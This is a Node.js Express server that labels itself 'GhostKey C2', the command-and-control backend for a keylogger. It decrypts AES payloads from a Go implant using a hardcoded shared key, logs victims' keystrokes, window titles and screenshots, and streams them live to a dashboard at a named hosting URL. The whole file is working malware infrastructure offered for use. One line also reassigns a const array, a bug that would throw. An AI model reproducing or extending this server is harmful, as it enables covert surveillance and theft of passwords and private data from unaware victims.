const express = require('express');
const CryptoJS = require('crypto-js');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const AES_KEY = "x93mK!qWeR7zL9p&2vN8bT5cY4fU6jH0";  // ←←← SAME AS GO BINARY

app.use(cors());
app.use(bodyParser.json({ limit: '20mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Explicit root route (critical for Render)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// SSE clients
const clients = [];

app.get('/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  // ←←← ADD THESE TWO LINES
  res.setHeader('X-Accel-Buffering', 'no');        // <--- THIS ONE IS CRITICAL FOR RENDER
  res.setHeader('Access-Control-Expose-Headers', '*');

  res.flushHeaders();

  res.write(': keep-alive\n\n');  // initial comment
  clients.push(res);

  req.on('close', () => {
    clients = clients.filter(c => c !== res);
  });
});

function broadcast(payload) {
  const message = JSON.stringify(payload);  // ← stringify ONLY ONCE
  clients.forEach(client => {
    try {
      client.write(`data: ${message}\n\n`);  // ← EXACTLY this format
    } catch (e) {
      // dead client, ignore
    }
  });
}

// NEW WORKING decrypt() — supports Go's IV-prepended AES-CBC
function decrypt(b64) {
  try {
    // Decode the full base64 (IV + ciphertext)
    const data = CryptoJS.enc.Base64.parse(b64);

    // Extract IV (first 16 bytes = 4 words)
    const iv = data.clone();
    iv.sigBytes = 16;
    iv.clamp();

    // Remove IV from the data
    const ciphertext = data.clone();
    ciphertext.words.splice(0, 4);           // remove first 4 words (16 bytes)
    ciphertext.sigBytes -= 16;

    // Decrypt
    const decrypted = CryptoJS.AES.decrypt(
      { ciphertext: ciphertext },
      CryptoJS.enc.Utf8.parse(AES_KEY),   // key must be exactly 32 chars/bytes
      {
        iv: iv,
        mode: CryptoJS.mode.CBC,
        padding: CryptoJS.pad.Pkcs7
      }
    );

    return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
  } catch (e) {
    console.log("Decrypt failed:", e.message);
    return null;
  }
}

// Keep Render from killing SSE
setInterval(() => {
  clients.forEach(client => {
    try { client.write(': ping\n\n'); } catch {}
  });
}, 15000);

// Main C2 endpoint
app.post('/ghost', (req, res) => {
  const payload = decrypt(req.body.data);
  if (payload) {
    console.log(`[+] ${payload.Client} | ${payload.Window} | ${payload.Keys?.length || 0} keys${payload.Screenshot ? ' + screenshot' : ''}`);
    broadcast(payload);  // ← sends raw payload with correct capital letters
  }
  res.json({ success: true });
});

// Legacy fallback
app.post('/log', (req, res) => res.json({ success: true }));

// 404 fallback
app.use((req, res) => {
  res.status(404).send("GhostKey C2 — No route");
});

app.listen(PORT, () => {
  console.log(`GhostKey Dashboard LIVE → https://fs-tracker-online-ghost.onrender.com`);
});